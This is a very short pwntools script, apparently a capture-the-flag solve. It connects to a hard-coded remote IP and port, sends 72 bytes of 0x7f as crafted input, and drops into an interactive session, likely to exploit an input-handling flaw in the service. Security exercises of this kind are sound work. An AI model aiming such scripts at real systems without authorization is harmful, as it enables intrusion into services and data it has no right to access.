from pwn import *

io = remote('34.124.157.94', 12321)
time.sleep(0.5)
io.sendline(b'\x7f'*72)
io.interactive()